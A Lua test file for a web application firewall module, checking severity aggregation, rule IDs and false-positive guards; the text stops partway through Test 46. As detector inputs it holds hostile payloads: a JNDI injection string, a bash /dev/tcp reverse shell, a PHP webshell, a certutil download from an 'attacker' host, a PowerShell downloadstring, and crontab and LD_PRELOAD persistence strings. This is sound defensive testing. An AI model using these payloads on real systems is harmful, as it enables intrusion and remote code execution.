-- Tests for cfm_waf _M.check severity-aggregation behaviour (Step 1 of the
-- WAF rework). Verifies that:
--   * a single hit returns the rule's configured action;
--   * highest severity wins when multiple rules fire on the same request;
--   * a block hit short-circuits later detectors;
--   * disabled rules never affect enforcement;
--   * body-only detectors are gated by method+body presence;
--   * the return tuple is the documented (hit, reason, ttl, action, hits).
--
-- Pattern: at the start of each test, disable every rule, then enable only
-- the rules under test via _M.set_rule. This keeps unrelated detectors out
-- of the picture and makes assertions deterministic.

_G.ngx = {
  now            = function() return 1000 end,
  decode_base64  = function(_) return nil end,
  log            = function(_, _) end,
  ERR            = 0, WARN = 1, INFO = 2,
}

package.path = "configs/lua/?.lua;" .. package.path
local waf = require("cfm_waf")

local fails = 0
local function check(cond, msg)
  if cond then return end
  fails = fails + 1
  io.stderr:write("FAIL: " .. msg .. "\n")
end

local function disable_all_rules()
  local snap = waf.get_config()
  for k, _ in pairs(snap) do
    if k:sub(1, 5) == "rule_" then
      waf.set_rule(k, "disabled")
    end
  end
end

local function fresh_ctx(overrides)
  local ctx = {
    uri     = "/",
    args    = "",
    method  = "GET",
    ip      = "1.2.3.4",
    headers = {},
    body    = "",
  }
  for k, v in pairs(overrides or {}) do ctx[k] = v end
  return ctx
end

-- ── Test 1: single block rule fires and returns block ────────────────────────
do
  disable_all_rules()
  waf.set_rule("rule_rce", "block")

  local hit, reason, _ttl, action, hits = waf.check(fresh_ctx({
    args = "x=${jndi:ldap://evil/}",
  }))
  check(hit == true,                     "1: rce block — hit=true")
  check(reason == "WAF_RCE",             "1: rce block — reason WAF_RCE")
  check(action == "block",               "1: rce block — action=block")
  check(type(hits) == "table" and #hits == 1, "1: rce block — hits has 1 entry")
end

-- ── Test 2: single logonly rule returns logonly ──────────────────────────────
do
  disable_all_rules()
  waf.set_rule("rule_traversal", "logonly")

  local hit, reason, _ttl, action = waf.check(fresh_ctx({ uri = "/foo/../etc/passwd" }))
  check(hit == true,            "2: traversal logonly — hit=true")
  check(reason == "WAF_TRAVERSAL", "2: traversal logonly — reason")
  check(action == "logonly",    "2: traversal logonly — action=logonly")
end

-- ── Test 3: single challenge rule returns challenge ──────────────────────────
do
  disable_all_rules()
  waf.set_rule("rule_bad_ua", "challenge")

  local hit, reason, _ttl, action = waf.check(fresh_ctx({
    method = "HEAD",
    headers = { ["User-Agent"] = "" },
  }))
  check(hit == true,                                "3: bad_ua challenge — hit=true")
  check(reason and reason:sub(1, 10) == "WAF_BAD_UA", "3: bad_ua challenge — reason prefix")
  check(action == "challenge",                      "3: bad_ua challenge — action=challenge")
end

-- ── Test 4: logonly first + block later → block (severity wins) ──────────────
-- Traversal (rule 5, logonly) fires first; RCE (rule 6, block) fires next.
-- A first-match WAF would have returned logonly. We return block.
do
  disable_all_rules()
  waf.set_rule("rule_traversal", "logonly")
  waf.set_rule("rule_rce",       "block")

  local hit, reason, _ttl, action, hits = waf.check(fresh_ctx({
    uri  = "/foo/../wp-config",
    args = "x=${jndi:ldap://",
  }))
  check(hit == true,        "4: logonly+block — hit=true")
  check(reason == "WAF_RCE", "4: logonly+block — final reason is WAF_RCE")
  check(action == "block",   "4: logonly+block — final action is block")
  check(#hits == 2,          "4: logonly+block — both hits recorded")
end

-- ── Test 5: challenge first + block later → block (severity wins) ────────────
-- Bad UA (rule 1, challenge) fires; then RCE (rule 6, block) fires.
do
  disable_all_rules()
  waf.set_rule("rule_bad_ua", "challenge")
  waf.set_rule("rule_rce",    "block")

  local hit, reason, _ttl, action, hits = waf.check(fresh_ctx({
    args    = "x=${jndi:ldap://",
    method  = "HEAD",
    headers = { ["User-Agent"] = "" },
  }))
  check(hit == true,        "5: challenge+block — hit=true")
  check(reason == "WAF_RCE", "5: challenge+block — final reason is WAF_RCE")
  check(action == "block",   "5: challenge+block — final action is block")
  check(#hits == 2,          "5: challenge+block — both hits recorded")
end

-- ── Test 6: block short-circuits later detectors ─────────────────────────────
-- RCE (rule 6) records block and goto-dones. XSS (rule 20) is configured
-- to fire on the same input but must never run.
do
  disable_all_rules()
  waf.set_rule("rule_rce", "block")
  waf.set_rule("rule_xss", "challenge")

  local hit, reason, _ttl, action, hits = waf.check(fresh_ctx({
    args = "x=${jndi:ldap://&y=<script>alert(1)</script>",
  }))
  check(hit == true,        "6: short-circuit — hit=true")
  check(reason == "WAF_RCE", "6: short-circuit — RCE wins")
  check(action == "block",   "6: short-circuit — action=block")
  check(#hits == 1,          "6: short-circuit — only RCE recorded, XSS skipped")
end

-- ── Test 7: multiple logonly rules → final logonly ───────────────────────────
do
  disable_all_rules()
  waf.set_rule("rule_traversal", "logonly")
  waf.set_rule("rule_ip_host",   "logonly")

  local hit, reason, _ttl, action, hits = waf.check(fresh_ctx({
    uri     = "/foo/../wp-config",
    headers = { ["Host"] = "10.0.0.1" },
  }))
  check(hit == true,                                                   "7: 2x logonly — hit=true")
  check(action == "logonly",                                           "7: 2x logonly — final action=logonly")
  check(#hits == 2,                                                    "7: 2x logonly — both hits recorded")
  check(reason == "WAF_TRAVERSAL" or reason == "WAF_IP_HOST",          "7: 2x logonly — reason from one of them")
end

-- ── Test 8: disabled rule does not affect enforcement ────────────────────────
-- Even if RCE input is present, with rule_rce=disabled there should be no hit.
do
  disable_all_rules()
  -- Leave rule_rce disabled; provide a payload that *would* trigger it.

  local hit = waf.check(fresh_ctx({ args = "x=${jndi:ldap://" }))
  check(hit == false, "8: disabled — no hit even with payload present")
end

-- ── Test 9: body-only detector skipped on GET (body_inspect_ok gating) ───────
-- rule_php_webshell_body is body-only and requires method=POST. A clean GET
-- with a webshell body must not fire it.
do
  disable_all_rules()
  waf.set_rule("rule_php_webshell_body", "challenge")

  local body = "<?php @eval($_POST['x']); system('id'); ?>"
  local hit = waf.check(fresh_ctx({
    method  = "GET",
    body    = body,
    headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
  }))
  check(hit == false, "9: GET+body — body detector gated off, no hit")
end

-- ── Test 10: same body fires on POST ─────────────────────────────────────────
do
  disable_all_rules()
  waf.set_rule("rule_php_webshell_body", "challenge")

  local body = "<?php @eval($_POST['x']); system('id'); ?>"
  local hit, reason, _ttl, action = waf.check(fresh_ctx({
    method  = "POST",
    body    = body,
    headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
  }))
  check(hit == true,                                              "10: POST+body — hit=true")
  check(reason and reason:sub(1, 22) == "WAF_PHP_WEBSHELL_BODY:", "10: POST+body — reason prefix")
  check(action == "challenge",                                    "10: POST+body — action=challenge")
end

-- ── Test 11: return tuple shape on no-hit ─────────────────────────────────────
do
  disable_all_rules()

  local hit, reason, ttl, action, hits = waf.check(fresh_ctx({}))
  check(hit == false, "11: no-hit — hit=false")
  check(reason == nil, "11: no-hit — reason is nil")
  check(ttl == nil,    "11: no-hit — ttl is nil")
  check(action == nil, "11: no-hit — action is nil")
  -- hits can be nil OR an empty table; accept either.
  check(hits == nil or (type(hits) == "table" and #hits == 0), "11: no-hit — hits empty/nil")
end

-- ── Test 12: hits[] preserves order and per-entry shape ──────────────────────
do
  disable_all_rules()
  waf.set_rule("rule_bad_ua",    "challenge")
  waf.set_rule("rule_traversal", "logonly")

  local _hit, _reason, _ttl, _action, hits = waf.check(fresh_ctx({
    uri     = "/foo/../wp-config",
    method  = "HEAD",
    headers = { ["User-Agent"] = "" },
  }))
  check(#hits == 2,                          "12: hits — 2 entries")
  -- Bad UA is rule 1; traversal is rule 5. So bad_ua should be hits[1].
  check(hits[1] and hits[1].action == "challenge", "12: hits — first entry is bad_ua challenge")
  check(hits[2] and hits[2].reason == "WAF_TRAVERSAL", "12: hits — second entry is traversal")
  check(hits[1].ttl ~= nil, "12: hits — entry has ttl")
end

-- ── Test 13: get_rule_ids() exposes the registry; rule_id_for(key) lookups ───
do
  local ids = waf.get_rule_ids()
  check(type(ids) == "table",                        "13: get_rule_ids — returns table")
  check(ids.rule_traversal == 101,                   "13: ids — rule_traversal=101")
  check(ids.rule_rce == 320,                         "13: ids — rule_rce=320")
  check(ids.rule_proxy_header_sqli == 321,           "13: ids — rule_proxy_header_sqli=321")
  check(ids.rule_xmlrpc_pingback == 511,             "13: ids — rule_xmlrpc_pingback=511")
  check(ids.rule_cmd_payload_pipe_bash == 315,       "13: ids — rule_cmd_payload_pipe_bash=315")

  -- Caller mutation must not leak into the live table.
  ids.rule_traversal = 999
  local ids2 = waf.get_rule_ids()
  check(ids2.rule_traversal == 101,                  "13: ids — table is a copy, original intact")

  check(waf.rule_id_for("rule_traversal") == 101,    "13: rule_id_for — known key returns ID")
  check(waf.rule_id_for("rule_does_not_exist") == nil, "13: rule_id_for — unknown key returns nil")
  check(waf.rule_id_for(nil) == nil,                 "13: rule_id_for — nil input returns nil")
  check(waf.rule_id_for(42) == nil,                  "13: rule_id_for — non-string returns nil")
end

-- ── Test 14: hit entries carry waf_rule_id; 6th return value is the strongest ─
do
  disable_all_rules()
  waf.set_rule("rule_rce", "block")

  local hit, _reason, _ttl, _action, hits, waf_rule_id = waf.check(fresh_ctx({
    args = "x=${jndi:ldap://evil/}",
  }))
  check(hit == true,                                 "14: rce — hit=true")
  check(waf_rule_id == 320,                          "14: rce — 6th return is rule_rce ID 320")
  check(hits[1] and hits[1].waf_rule_id == 320,      "14: rce — hits[1].waf_rule_id == 320")
end

-- ── Test 15: severity-wins picks the strongest rule's ID, not first-match ────
do
  disable_all_rules()
  waf.set_rule("rule_traversal", "logonly")  -- ID 101
  waf.set_rule("rule_rce",       "block")     -- ID 320

  local hit, _reason, _ttl, _action, hits, waf_rule_id = waf.check(fresh_ctx({
    uri  = "/foo/../wp-config",
    args = "x=${jndi:ldap://",
  }))
  check(hit == true,                                 "15: combo — hit=true")
  check(waf_rule_id == 320,                          "15: combo — final waf_rule_id is RCE (320), not TRAVERSAL (101)")
  check(#hits == 2,                                  "15: combo — both hits recorded")
  -- Iteration order at call sites: traversal records before RCE.
  check(hits[1].waf_rule_id == 101,                  "15: combo — hits[1] is traversal (101)")
  check(hits[2].waf_rule_id == 320,                  "15: combo — hits[2] is rce (320)")
end

-- ── Test 16: cmd_payload sub-rule IDs map per tag ─────────────────────────────
do
  disable_all_rules()
  -- All cmd_payload variants default to "challenge" except backtick (logonly);
  -- explicit set is defensive in case of CFG drift.
  waf.set_rule("rule_cmd_payload",            "challenge")
  waf.set_rule("rule_cmd_payload_pipe_bash",  "challenge")

  local hit, _reason, _ttl, _action, _hits, waf_rule_id = waf.check(fresh_ctx({
    args = "x=foo|bash",
  }))
  if hit then
    check(waf_rule_id == 315,                        "16: cmd_payload pipe_bash — ID 315")
  end
  -- Tolerant pass: detector might match a different tag depending on
  -- payload tokenisation; we just ensure that *if* it hit, the ID came from
  -- the per-tag override map (any 311-317).
  if hit and waf_rule_id ~= 315 then
    check(waf_rule_id and waf_rule_id >= 311 and waf_rule_id <= 317,
      "16: cmd_payload — fell back to a sibling tag ID in 311-317")
  end
end

-- ── Test 17: ctx.skip_rule_ids suppresses excluded rule hits ─────────────────
-- Per-vhost rule exclusions: when an operator excludes a rule for a host, the
-- detector still runs but record() drops the hit. Verify no leak into hits[]
-- or the strongest-action return tuple.
do
  disable_all_rules()
  waf.set_rule("rule_traversal", "challenge")
  -- Rule fires (uri = "/foo/../wp-config" — sensitive sink), but
  -- skip_rule_ids = {[101]=true} should suppress it as if the rule
  -- were disabled for this host.
  local hit, reason, _ttl, action, hits = waf.check(fresh_ctx({
    uri = "/foo/../wp-config",
    skip_rule_ids = { [101] = true },
  }))
  check(hit == false,                "17: skip_rule_ids — rule 101 suppressed, no hit")
  check(reason == nil,               "17: skip_rule_ids — reason nil")
  check(action == nil,               "17: skip_rule_ids — action nil")
  check(hits == nil or #hits == 0,   "17: skip_rule_ids — hits empty")
end

-- ── Test 18: skip_rule_ids only suppresses the listed IDs; others still fire ─
do
  disable_all_rules()
  waf.set_rule("rule_traversal", "logonly")  -- ID 101 — to be skipped
  waf.set_rule("rule_rce",       "block")    -- ID 320 — must still fire

  local hit, _reason, _ttl, action, hits, rule_id = waf.check(fresh_ctx({
    uri  = "/foo/../wp-config",
    args = "x=${jndi:ldap://evil/}",
    skip_rule_ids = { [101] = true },
  }))
  check(hit == true,         "18: skip_rule_ids — non-excluded rule (320) still fires")
  check(action == "block",   "18: skip_rule_ids — block action survives")
  check(rule_id == 320,      "18: skip_rule_ids — strongest rule_id is RCE")
  check(#hits == 1,          "18: skip_rule_ids — only 1 hit recorded (101 was suppressed)")
  check(hits[1].waf_rule_id == 320, "18: skip_rule_ids — hits[1] is RCE not traversal")
end

-- ── Test 19: W1 webshell_path — proper-noun name routes to rule 413 (block) ──
-- c99.php is in the KNOWN (block-tier) set, so it fires rule 413 regardless of
-- the ambiguous rule 410's mode.
do
  disable_all_rules()
  waf.set_rule("rule_webshell_path_known", "block")

  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
    uri = "/wp-content/uploads/c99.php",
  }))
  check(hit == true,                          "19: webshell_path known — hit")
  check(reason == "WAF_WEBSHELL:PATH:c99.php", "19: webshell_path known — reason")
  check(action == "block",                     "19: webshell_path known — block")
  check(rule_id == 413,                        "19: webshell_path known — rule id 413")
end

-- ── Test 19b: W1 webshell_path — ambiguous name routes to rule 410 (challenge) ─
-- shell.php is in the ambiguous set (residual FP tail), so it stays at the
-- challenge-tier rule 410 even when the known/block rule is enabled.
do
  disable_all_rules()
  waf.set_rule("rule_webshell_path", "challenge")
  waf.set_rule("rule_webshell_path_known", "block")

  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
    uri = "/uploads/shell.php",
  }))
  check(hit == true,                            "19b: webshell_path amb — hit")
  check(reason == "WAF_WEBSHELL:PATH:shell.php", "19b: webshell_path amb — reason")
  check(action == "challenge",                  "19b: webshell_path amb — challenge")
  check(rule_id == 410,                         "19b: webshell_path amb — rule id 410")

  -- alfa.php (ALFA TEaM shell) is a real-word/brand collision, so it lives in
  -- the challenge tier (410), NOT the block tier — a legit /alfa.php page gets a
  -- recoverable one-time challenge, not a hard 403 for every visitor.
  local _h, ar, _t, aact, _hh, arid = waf.check(fresh_ctx({ uri = "/alfa.php" }))
  check(ar == "WAF_WEBSHELL:PATH:alfa.php", "19b: alfa.php — reason")
  check(aact == "challenge",                "19b: alfa.php — challenge (not block)")
  check(arid == 410,                        "19b: alfa.php — rule id 410")
end

-- ── Test 20: W1 webshell_path — case-insensitive basename match (known/413) ──
do
  disable_all_rules()
  waf.set_rule("rule_webshell_path_known", "block")

  local hit, reason, _ttl, _action, _hits, rule_id = waf.check(fresh_ctx({ uri = "/UPLOADS/R57.PHP?cmd=id" }))
  check(hit == true,                          "20: webshell_path — case-insensitive hit")
  check(reason == "WAF_WEBSHELL:PATH:r57.php", "20: webshell_path — basename lowered")
  check(rule_id == 413,                        "20: webshell_path — routes to 413")
end

-- ── Test 21: W1 webshell_path — non-matching path doesn't fire ────────────────
do
  disable_all_rules()
  waf.set_rule("rule_webshell_path", "challenge")
  waf.set_rule("rule_webshell_path_known", "block")

  local hit = waf.check(fresh_ctx({ uri = "/help/r57.php-explained.html" }))
  check(hit == false, "21: webshell_path — basename mismatch, no hit")
end

-- ── Test 21b: W1 webshell_path — a known name does NOT fall back to rule 410 ──
-- If the block-tier rule 413 is disabled, a proper-noun name must go silent,
-- not degrade to the ambiguous challenge rule.
do
  disable_all_rules()
  waf.set_rule("rule_webshell_path", "challenge")  -- ambiguous rule enabled
  -- rule_webshell_path_known stays disabled

  local hit = waf.check(fresh_ctx({ uri = "/uploads/c99.php" }))
  check(hit == false, "21b: known name does not fall back to ambiguous rule 410")
end

-- ── Test 22: R1 reverse_shell — bash /dev/tcp in args (rule 322) ─────────────
do
  disable_all_rules()
  waf.set_rule("rule_reverse_shell", "logonly")

  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
    uri  = "/cgi-bin/exploit.cgi",
    args = "cmd=bash%20-i%20%3E%26%20/dev/tcp/1.2.3.4/4444",
  }))
  check(hit == true,                                "22: reverse_shell — hit")
  check(reason and reason:find("WAF_RCE:REVERSE_SHELL:BASH_TCP", 1, true),
                                                    "22: reverse_shell — reason")
  check(action == "logonly",                        "22: reverse_shell — logonly")
  check(rule_id == 322,                             "22: reverse_shell — rule id 322")
end

-- ── Test 23: R1 reverse_shell — python -c socket in POST body ────────────────
do
  disable_all_rules()
  waf.set_rule("rule_reverse_shell", "logonly")

  local hit, reason = waf.check(fresh_ctx({
    method = "POST",
    body   = "code=python -c 'import socket;s=socket.socket()'",
  }))
  check(hit == true,                                                "23: reverse_shell — body hit")
  check(reason and reason:find("REVERSE_SHELL:PY_SOCKET", 1, true), "23: reverse_shell — PY_SOCKET tag")
end

-- ── Test 24: R1 reverse_shell — benign string doesn't fire ───────────────────
do
  disable_all_rules()
  waf.set_rule("rule_reverse_shell", "logonly")

  -- "import socket" alone (without "python -c") must not match.
  local hit = waf.check(fresh_ctx({
    method = "POST",
    body   = "Hello, this article explains how to import socket in python.",
  }))
  check(hit == false, "24: reverse_shell — bare 'import socket' prose, no hit")
end

-- ── Test 25: B5 webshell_ping — POST + empty UA + CL:0 + .php (rule 411) ─────
do
  disable_all_rules()
  waf.set_rule("rule_webshell_ping", "logonly")

  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
    method = "POST",
    uri    = "/uploads/x.php",
    headers = {
      ["User-Agent"]     = "",
      ["Content-Length"] = "0",
    },
  }))
  check(hit == true,                       "25: webshell_ping — hit")
  check(reason == "WAF_WEBSHELL:PING",     "25: webshell_ping — reason")
  check(action == "logonly",               "25: webshell_ping — logonly")
  check(rule_id == 411,                    "25: webshell_ping — rule id 411")
end

-- ── Test 26: B5 webshell_ping — non-php URI doesn't fire ─────────────────────
do
  disable_all_rules()
  waf.set_rule("rule_webshell_ping", "logonly")

  local hit = waf.check(fresh_ctx({
    method = "POST",
    uri    = "/api/event",
    headers = {
      ["User-Agent"]     = "",
      ["Content-Length"] = "0",
    },
  }))
  check(hit == false, "26: webshell_ping — non-php URI, no hit")
end

-- ── Test 27: B5 webshell_ping — UA present doesn't fire (legit POST) ─────────
do
  disable_all_rules()
  waf.set_rule("rule_webshell_ping", "logonly")

  local hit = waf.check(fresh_ctx({
    method = "POST",
    uri    = "/uploads/x.php",
    headers = {
      ["User-Agent"]     = "Mozilla/5.0",
      ["Content-Length"] = "0",
    },
  }))
  check(hit == false, "27: webshell_ping — non-empty UA, no hit")
end

-- ── Test 28: R2 persistence — crontab append in args (rule 323) ──────────────
do
  disable_all_rules()
  waf.set_rule("rule_persistence", "logonly")

  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
    args = "cmd=(crontab%20-l;%20echo%20miner)",
  }))
  check(hit == true,                                            "28: persistence — hit")
  check(reason and reason:find("PERSISTENCE:CRONTAB_APPEND", 1, true),
                                                                "28: persistence — tag")
  check(action == "logonly",                                    "28: persistence — logonly")
  check(rule_id == 323,                                         "28: persistence — rule id 323")
end

-- ── Test 29: R2 persistence — bare crontab mention doesn't fire ──────────────
do
  disable_all_rules()
  waf.set_rule("rule_persistence", "logonly")

  -- "crontab -l" alone is too benign to flag (admin tools list cron).
  local hit = waf.check(fresh_ctx({
    method = "POST",
    body   = "Run 'crontab -l' to list cron entries.",
  }))
  check(hit == false, "29: persistence — bare crontab -l prose, no hit")
end

-- ── Test 30: R3 rootkit_artifacts — LD_PRELOAD path in body (rule 324) ───────
do
  disable_all_rules()
  waf.set_rule("rule_rootkit_artifacts", "logonly")

  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
    method = "POST",
    body   = "evil=LD_PRELOAD=/tmp/x.so /usr/bin/id",
  }))
  check(hit == true,                                          "30: rootkit — hit")
  check(reason and reason:find("ROOTKIT:LD_PRELOAD_PATH", 1, true),
                                                              "30: rootkit — tag")
  check(action == "logonly",                                  "30: rootkit — logonly")
  check(rule_id == 324,                                       "30: rootkit — rule id 324")
end

-- ── Test 31: R3 rootkit_artifacts — bare LD_PRELOAD mention doesn't fire ─────
do
  disable_all_rules()
  waf.set_rule("rule_rootkit_artifacts", "logonly")

  -- "LD_PRELOAD" without the =/ assignment shape is benign prose.
  local hit = waf.check(fresh_ctx({
    method = "POST",
    body   = "The LD_PRELOAD environment variable lets you preload a shared library.",
  }))
  check(hit == false, "31: rootkit — bare LD_PRELOAD prose, no hit")
end

-- ── Test 32: R4 lolbin — certutil downloader (rule 325) ──────────────────────
do
  disable_all_rules()
  waf.set_rule("rule_lolbin", "logonly")

  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
    method = "POST",
    body   = "cmd=certutil -urlcache -split -f http://attacker/x.exe",
  }))
  check(hit == true,                                          "32: lolbin — hit")
  check(reason and reason:find("LOLBIN:CERTUTIL_URLCACHE", 1, true),
                                                              "32: lolbin — tag")
  check(action == "logonly",                                  "32: lolbin — logonly")
  check(rule_id == 325,                                       "32: lolbin — rule id 325")
end

-- ── Test 33: R4 lolbin — IEX-WebClient is R1's territory, not R4's ───────────
do
  disable_all_rules()
  waf.set_rule("rule_lolbin",        "logonly")
  waf.set_rule("rule_reverse_shell", "logonly")

  -- Pattern that's intentionally only in R1's table (not R4's). Asserts R4
  -- doesn't double-count it; the hit should come from rule 322, not 325.
  local hit, _reason, _ttl, _action, _hits, rule_id = waf.check(fresh_ctx({
    method = "POST",
    body   = "cmd=iex(new-object net.webclient).downloadstring('http://x')",
  }))
  check(hit == true,    "33: lolbin/r1 — IEX-WebClient hit")
  check(rule_id == 322, "33: lolbin/r1 — credited to R1 (322), not R4 (325)")
end

-- ── Test 34: C2 java_deserialize — base64 prefix in body (rule 326) ──────────
do
  disable_all_rules()
  waf.set_rule("rule_java_deserialize", "logonly")

  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
    method = "POST",
    body   = "payload=rO0ABXNyABxqYXZhLnV0aWwuQXJyYXlMaXN0",
  }))
  check(hit == true,                                                "34: java_deserialize — hit")
  check(reason == "WAF_RCE:JAVA_DESERIALIZE:B64_PREFIX",            "34: java_deserialize — reason")
  check(action == "logonly",                                        "34: java_deserialize — logonly")
  check(rule_id == 326,                                             "34: java_deserialize — rule id 326")
end

-- ── Test 34b: java_deserialize — fbclid mid-token "rO0AB" must NOT fire ─────
-- The base64 magic "rO0AB" (base64 of AC ED 00 05) is only meaningful at a
-- value boundary. A Facebook click id is a long base64url token that can
-- carry the five chars in its middle by chance, e.g.
--   fbclid=...VrO0ABr5eDDx...   (captured 2026-05-31, axidwear.com, a real
-- shopper arriving from m.facebook.com). It was challenged before the
-- boundary+case-sensitive fix. It must NOT match now.
do
  disable_all_rules()
  waf.set_rule("rule_java_deserialize", "challenge")

  local hit, reason = waf.check(fresh_ctx({
    args = "attribute_pa_size=9-12m&utm_source=fb&fbclid=IwZXh0bgNhZW0BMABhZGlkAasx5Aqevu5zcnRjVrO0ABr5eDDx-RiNJOZm96EjXRsCv8205Etw&koino=new_aud",
  }))
  check(hit == false, "34b: java_deserialize — fbclid mid-token rO0AB must NOT fire (got " .. tostring(reason) .. ")")
end

-- ── Test 34c: java_deserialize — lowercased "ro0ab" must NOT fire ──────────
-- Real Java base64 is always exactly "rO0AB"; a lowercased form never
-- decodes to the stream magic, so case-insensitive matching only added FP
-- surface. Verify the case-sensitive guard.
do
  disable_all_rules()
  waf.set_rule("rule_java_deserialize", "challenge")

  local hit = waf.check(fresh_ctx({ args = "token=xyzro0abxnyab" }))
  check(hit == false, "34c: java_deserialize — lowercased ro0ab must NOT fire")
end

-- ── Test 35: C2 java_deserialize — raw magic bytes in body ──────────────────
do
  disable_all_rules()
  waf.set_rule("rule_java_deserialize", "logonly")

  -- Construct a body with the raw 4-byte STREAM_MAGIC + STREAM_VERSION.
  local body = "garbagepre\xac\xed\x00\x05garbagepost"
  local hit, reason = waf.check(fresh_ctx({
    method = "POST",
    body   = body,
  }))
  check(hit == true,                                       "35: java_deserialize — raw magic hit")
  check(reason == "WAF_RCE:JAVA_DESERIALIZE:RAW_MAGIC",    "35: java_deserialize — RAW_MAGIC tag")
end

-- ── Test 36: C2 java_deserialize — hex form in args ──────────────────────────
do
  disable_all_rules()
  waf.set_rule("rule_java_deserialize", "logonly")

  local hit, reason = waf.check(fresh_ctx({
    args = "blob=aced00057372001c6a6176",
  }))
  check(hit == true,                                       "36: java_deserialize — hex hit")
  check(reason == "WAF_RCE:JAVA_DESERIALIZE:HEX_PREFIX",   "36: java_deserialize — HEX_PREFIX tag")
end

-- ── Test 37: C2 java_deserialize — Cookie header carries the gadget ──────────
do
  disable_all_rules()
  waf.set_rule("rule_java_deserialize", "logonly")

  local hit, reason, _ttl, _action, _hits, rule_id = waf.check(fresh_ctx({
    headers = { ["Cookie"] = "JSESSIONID=rO0ABXNyABF" },
  }))
  check(hit == true,                                               "37: java_deserialize — cookie hit")
  check(reason == "WAF_RCE:JAVA_DESERIALIZE:B64_PREFIX",           "37: java_deserialize — cookie reason")
  check(rule_id == 326,                                            "37: java_deserialize — cookie rule id")
end

-- ── Test 38: C2 java_deserialize — benign base64 doesn't fire ────────────────
do
  disable_all_rules()
  waf.set_rule("rule_java_deserialize", "logonly")

  -- "Hello world" base64 = "SGVsbG8gd29ybGQ=" — has no rO0AB prefix and
  -- no aced0005 substring. Verifies the detector doesn't fire on random b64.
  local hit = waf.check(fresh_ctx({
    args = "data=SGVsbG8gd29ybGQ=",
  }))
  check(hit == false, "38: java_deserialize — benign base64, no hit")
end

-- ── Test 39: C2 java_deserialize — does NOT shadow PHP serialize (rule 306) ──
do
  disable_all_rules()
  waf.set_rule("rule_java_deserialize", "logonly")
  waf.set_rule("rule_serialize",        "logonly")

  -- PHP serialized object — should fire 306 only, not 326.
  local hit, _reason, _ttl, _action, _hits, rule_id = waf.check(fresh_ctx({
    args = 'data=O:8:"stdClass":1:{s:1:"x";i:1;}',
  }))
  check(hit == true,    "39: java/php disjoint — PHP serialize fires")
  check(rule_id == 306, "39: java/php disjoint — credited to PHP (306), not Java (326)")
end

-- ── Test 40: W2 ext — webshell-name b374k + <?php scores past threshold ──────
do
  disable_all_rules()
  waf.set_rule("rule_php_webshell_body", "challenge")

  -- b374k (+3) + <?php (+2) = 5 → exactly at min_score, fires.
  local hit, reason, _ttl, action, _hits, rule_id = waf.check(fresh_ctx({
    method  = "POST",
    headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
    body    = "src=<?php /* b374k loader */",
  }))
  check(hit == true,                            "40: W2 ext — hit")
  check(reason == "WAF_PHP_WEBSHELL_BODY:RAW_WS_B374K", "40: W2 ext — RAW_WS_B374K tag")
  check(action == "challenge",                  "40: W2 ext — challenge")
  check(rule_id == 404,                         "40: W2 ext — rule id 404 (extension, not new rule)")
end

-- ── Test 41: W2 ext — bare webshell-name in prose without <?php doesn't fire ─
do
  disable_all_rules()
  waf.set_rule("rule_php_webshell_body", "challenge")

  -- Just "b374k" alone (+3) is below min_score (5). The early-out lets us
  -- reach scoring (b374k is a trigger), but score stays under threshold.
  local hit = waf.check(fresh_ctx({
    method  = "POST",
    headers = { ["Content-Type"] = "text/plain" },
    body    = "Article comment: I read about the b374k shell yesterday.",
  }))
  check(hit == false, "41: W2 ext — bare prose mention doesn't trigger")
end

-- ── Test 42: W2 ext — c99shell name takes precedence over generic eval tag ──
do
  disable_all_rules()
  waf.set_rule("rule_php_webshell_body", "challenge")

  -- c99shell (+3) + <?php (+2) + eval (+3) = 8. Both ws_tag and the
  -- callable would emit a tag; ws_tag wins per the design.
  local _hit, reason = waf.check(fresh_ctx({
    method  = "POST",
    headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
    body    = "code=<?php c99shell; eval($_POST['x']);",
  }))
  check(reason == "WAF_PHP_WEBSHELL_BODY:RAW_WS_C99SHELL",
        "42: W2 ext — webshell-name tag outranks RAW_EVAL_POST")
end

-- ── Test 43: W3 ext — hex2bin contributes to obfuscation score (rule 405) ───
do
  disable_all_rules()
  waf.set_rule("rule_script_obfuscation", "challenge")

  -- hex2bin (+2) + base64_decode (+2) + eval (+3) = 7 → past min_score (6).
  local hit, reason, _ttl, _action, _hits, rule_id = waf.check(fresh_ctx({
    method  = "POST",
    headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
    body    = "x=eval(hex2bin(base64_decode($_POST['p'])))",
  }))
  check(hit == true,                                         "43: W3 ext — hit")
  check(reason and reason:find("HEX2BIN", 1, true),          "43: W3 ext — HEX2BIN in tags")
  check(rule_id == 405,                                      "43: W3 ext — rule id 405")
end

-- ── Test 44: B2 ext — TRACE method emits sub-tag in reason ──────────────────
do
  disable_all_rules()
  waf.set_rule("rule_exploit_methods", "block")

  local hit, reason, _ttl, action = waf.check(fresh_ctx({ method = "TRACE" }))
  check(hit == true,                              "44: B2 ext — TRACE hit")
  check(reason == "WAF_EXPLOIT_METHOD:TRACE",     "44: B2 ext — sub-tag emitted")
  check(action == "block",                        "44: B2 ext — block action preserved")
end

-- ── Test 45: PROPFIND/SEARCH no longer trigger rule_exploit_methods ─────────
-- DAV methods are used by ownCloud/Nextcloud/Outlook; flagging them globally
-- breaks login/sync. They must pass through even when the rule is set to block.
do
  disable_all_rules()
  waf.set_rule("rule_exploit_methods", "block")

  local hit_p = waf.check(fresh_ctx({ method = "PROPFIND" }))
  check(hit_p ~= true, "45: PROPFIND not flagged by rule_exploit_methods")

  local hit_s = waf.check(fresh_ctx({ method = "SEARCH" }))
  check(hit_s ~= true, "45: SEARCH not flagged by rule_exploit_methods")
end

-- ── Test 46: X2-stratum ext — stratum+tcp:// fires rule 701 ─────────────────
do
  disable_all_rules()
  waf.set_rule("rule_ssrf", "logonly")

  local hit, reason, _ttl, _action, _hits, rule_id = waf.check(fresh_ctx({
